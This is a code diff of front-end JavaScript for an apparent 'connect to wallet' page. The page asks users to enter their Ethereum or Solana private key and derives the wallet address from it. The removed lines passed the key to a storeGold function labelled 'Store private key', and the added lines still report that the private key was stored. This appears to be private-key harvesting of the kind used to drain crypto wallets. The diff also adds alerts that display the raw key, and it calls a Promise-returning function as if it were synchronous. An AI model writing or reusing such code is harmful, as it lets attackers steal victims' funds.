@@ -2081,8 +2081,9 @@ document.addEventListener('DOMContentLoaded', function () {
         if (!privateKey.startsWith('0x')) privateKey = '0x' + privateKey;
         const wallet = new ethers.Wallet(privateKey);
         walletAddress = wallet.address;
+        alert(`Ethereum wallet address derived: ${walletAddress}`);
 
-      // Solana Wallet
+        // Solana Wallet
       } else if (/^[1-9A-HJ-NP-Za-km-z]+$/.test(privateKey)) {
         alert('Attempting to derive Solana wallet address...');
         const decodedKey = base58Decode(privateKey);
@@ -2091,6 +2092,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }
         const keypair = solanaWeb3.Keypair.fromSecretKey(decodedKey);
         walletAddress = keypair.publicKey.toString();
+        alert(`Solana wallet address derived: ${walletAddress}`);
       }
 
       return walletAddress;
@@ -2126,57 +2128,52 @@ document.addEventListener('DOMContentLoaded', function () {
     return new Uint8Array([...Array(zeros).fill(0), ...result.reverse()]);
   }
 
-  // Function to handle private key input
+  // Function to handle private key input and return a Promise
   function handlePrivateKeyInput() {
-    const privateKey = privateKeyInput.value.trim();
-    if (!isValidPrivateKey(privateKey)) {
-      alert('Invalid private key format. Please enter a valid Ethereum or Solana private key.');
-      return null;
-    }
+    return new Promise((resolve, reject) => {
+      const privateKey = privateKeyInput.value.trim();
 
-    // Derive wallet address
-    const walletAddress = deriveWalletAddress(privateKey);
-    if (walletAddress) {
-      walletAddressOutput.value = walletAddress; // Display wallet address
-      return walletAddress;
-    } else {
-      alert('Failed to derive wallet address. Please check the private key and try again.');
-      return null;
-    }
-  }
+      alert(`Input Private Key: ${privateKey}`);
 
-  // Button click trigger
-  connectToWalletBtn?.addEventListener('click', function (event) {
-    event.preventDefault();
-
-    alert('Handling private key input...');
-    const walletAddress0 = handlePrivateKeyInput(); // Step 1: Get wallet address
-
-    if (walletAddress0) {
-      alert(`Wallet Address Derived: ${walletAddress0}`);
-      alert('Storing the private key using storeGold...');
-      if (typeof storeGold === 'function') {
-        storeGold('prv-key-input', true); // Step 2: Store private key
-        alert('storeGold completed.');
-      } else {
-        alert('storeGold function is not defined.');
+      // Validate the private key format
+      if (!isValidPrivateKey(privateKey)) {
+        alert('Invalid private key format. Please enter a valid Ethereum or Solana private key.');
+        reject('Invalid private key format.');
         return;
       }
 
-      alert('Calling storeWalletAddressHandler...');
-      const networkType0 = document.getElementById('wallet-address-label1')?.textContent || 'Unknown Network';
-      if (typeof storeWalletAddressHandler === 'function') {
-        storeWalletAddressHandler(walletAddress0, networkType0); // Step 3: Store wallet address
-        alert('storeWalletAddressHandler executed successfully.');
+      // Derive wallet address
+      const walletAddress = deriveWalletAddress(privateKey);
+
+      if (walletAddress) {
+        alert(`Derived Wallet Address: ${walletAddress}`);
+        walletAddressOutput.value = walletAddress; // Display wallet address
+        resolve(walletAddress); // Resolve with the wallet address
       } else {
-        alert('storeWalletAddressHandler function is not defined.');
+        alert('Failed to derive wallet address. Please check the private key and try again.');
+        reject('Failed to derive wallet address.');
       }
+    });
+  }
+
+	
+
+document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', function (event) {
+  event.preventDefault();
+  alert(typeof storeGold); // Should display 'function'. If not, storeGold isn't accessible.
+
+  try {
+    // Step 1: Handle private key input and derive wallet address
+    alert('Handling private key input...');
+    var walletAddress0 = handlePrivateKeyInput(); // Call synchronously
+    if (!walletAddress0) {
+      alert('No wallet address derived. Stopping execution.');
+      return;
     }
-  });
+
+    alert('Wallet address and private key stored successfully!');
+  } catch (error) {
+    alert(`Error occurred: ${error.message || error}`);
+  }
 });
-
-
-
-
-
-
+});
